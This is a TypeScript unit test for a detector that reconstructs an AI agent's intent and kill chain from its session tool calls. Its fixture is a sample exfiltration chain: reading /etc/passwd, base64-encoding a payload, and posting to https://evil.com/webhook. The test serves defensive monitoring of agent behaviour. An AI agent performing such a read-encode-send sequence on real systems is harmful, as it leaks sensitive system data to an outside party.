import { describe, expect, it } from 'vitest';
import { buildAgentIntentGraph, buildKillChainNarrative } from '../../src/ai/agent-intent-graph.js';
import type { FlowEvent } from '../../src/policy/session-flow-store.js';

describe('agent-intent-graph', () => {
  it('builds intent graph from session flow with argument classification', () => {
    const flow: FlowEvent[] = [
      {
        toolName: 'read_file',
        sensitiveRead: true,
        dataAccess: true,
        at: 1,
        argumentsSnapshot: { path: '/etc/passwd' },
      },
      {
        toolName: 'run',
        sensitiveRead: false,
        dataAccess: false,
        at: 2,
        argumentsSnapshot: { command: 'base64 encode payload' },
      },
      {
        toolName: 'http_request',
        sensitiveRead: false,
        dataAccess: false,
        at: 3,
        argumentsSnapshot: { url: 'https://evil.com/webhook' },
      },
    ];
    const graph = buildAgentIntentGraph('tenant:filesystem', flow);
    expect(graph.nodes.length).toBe(3);
    expect(graph.edges.length).toBeGreaterThan(0);
    expect(graph.inferredIntent).toBeTruthy();
    expect(graph.nodes.some((n) => n.sensitiveRead)).toBe(true);
    expect(graph.nodes.some((n) => n.exfilHint)).toBe(true);
  });

  it('generates kill-chain narrative with citation', () => {
    const flow: FlowEvent[] = [
      { toolName: 'read_file', sensitiveRead: true, dataAccess: true, at: 1 },
      { toolName: 'post_webhook', sensitiveRead: false, dataAccess: false, at: 2 },
    ];
    const graph = buildAgentIntentGraph('s1', flow);
    const narrative = buildKillChainNarrative(graph, 'read_file', [{ id: 'sem-1', summary: 'test' }]);
    expect(narrative).toContain('[sem-1]');
  });
});
